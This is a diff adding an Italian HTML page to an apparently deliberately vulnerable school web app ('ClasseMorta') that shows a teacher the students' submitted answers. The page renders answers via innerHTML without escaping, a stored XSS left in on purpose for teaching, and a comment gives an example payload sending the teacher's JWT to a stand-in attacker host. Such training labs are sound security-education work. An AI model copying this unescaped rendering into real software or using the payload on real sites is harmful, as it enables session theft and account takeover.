@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Risposte verifica - ClasseMorta</title>
+    <link rel="icon" href="assets/logo.png">
+    <link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+
+    <header class="cm-header"></header>
+
+    <main class="cm-main">
+        <a href="verifiche.html" class="cm-text-small">&larr; Torna alle verifiche</a>
+        <h1 class="cm-page-title cm-mt-12" id="titolo">Risposte</h1>
+        <p class="cm-page-sub" id="meta"></p>
+
+        <div class="cm-card">
+            <div id="alertBox" class="cm-alert hidden"></div>
+            <div id="container"></div>
+        </div>
+    </main>
+
+    <script src="app.js"></script>
+    <script>
+        const user = requireAuth("professore");
+        const params = new URLSearchParams(window.location.search);
+        const verificaId = parseInt(params.get("id"));
+
+        if (user && !verificaId) {
+            window.location.href = "verifiche.html";
+        }
+        if (user) {
+            renderNavbar("verifiche");
+            carica();
+        }
+
+        async function carica() {
+            const container = document.getElementById("container");
+            container.innerHTML = `<div class="cm-empty">Caricamento...</div>`;
+            try {
+                const data = await apiFetch(`/api/verifiche/${verificaId}/risposte`);
+                document.getElementById("titolo").textContent = data.verifica.titolo;
+                document.getElementById("meta").innerHTML =
+                    `<span class="cm-badge">${escapeHtml(data.verifica.classe)}</span> ` +
+                    `${escapeHtml(data.verifica.materia)} · ${formatDate(data.verifica.data_creazione)}`;
+
+                if (!data.risposte.length) {
+                    container.innerHTML = `<div class="cm-empty">Nessuno studente ha ancora consegnato.</div>`;
+                    return;
+                }
+
+                // Raggruppa risposte per studente.
+                const perStudente = {};
+                data.risposte.forEach(r => {
+                    const k = r.studente_id;
+                    if (!perStudente[k]) {
+                        perStudente[k] = {
+                            studente: `${r.studente_cognome} ${r.studente_nome}`,
+                            risposte: [],
+                        };
+                    }
+                    perStudente[k].risposte.push(r);
+                });
+
+                container.innerHTML = "";
+                Object.values(perStudente).forEach(blocco => {
+                    const card = document.createElement("div");
+                    card.className = "cm-card";
+                    card.style.marginTop = "16px";
+                    card.style.boxShadow = "none";
+                    card.style.border = "1px solid var(--cm-border)";
+
+                    let html = `<h2>${escapeHtml(blocco.studente)}</h2>`;
+                    blocco.risposte
+                        .sort((a, b) => a.ordine - b.ordine)
+                        .forEach(r => {
+                            html += `
+                                <div class="cm-domanda">${escapeHtml(r.domanda_testo)}</div>
+                                <div class="cm-risposta-box">
+                                    <div class="cm-risposta-meta">
+                                        Consegnata il ${formatDate(r.data_consegna)}
+                                    </div>
+                                    <div class="cm-risposta-html"
+                                         data-raw="${encodeURIComponent(r.testo)}"></div>
+                                </div>
+                            `;
+                        });
+                    card.innerHTML = html;
+                    container.appendChild(card);
+                });
+
+                // ⚠️⚠️⚠️ VULNERABILITÀ DIDATTICA: STORED XSS ⚠️⚠️⚠️
+                // Le risposte degli studenti vengono renderizzate via innerHTML
+                // senza alcun escaping. Uno studente può inserire ad esempio:
+                //   <img src=x onerror="fetch('http://attaccante/?t='+localStorage.getItem('classemorta_jwt'))">
+                // e rubare il JWT del professore quando questa pagina viene aperta.
+                document.querySelectorAll(".cm-risposta-html").forEach(div => {
+                    const raw = decodeURIComponent(div.dataset.raw || "");
+                    div.innerHTML = raw;   // <-- XSS qui
+                });
+            } catch (err) {
+                container.innerHTML = `<div class="cm-alert cm-alert-error">${escapeHtml(err.message)}</div>`;
+            }
+        }
+    </script>
+</body>
+</html>
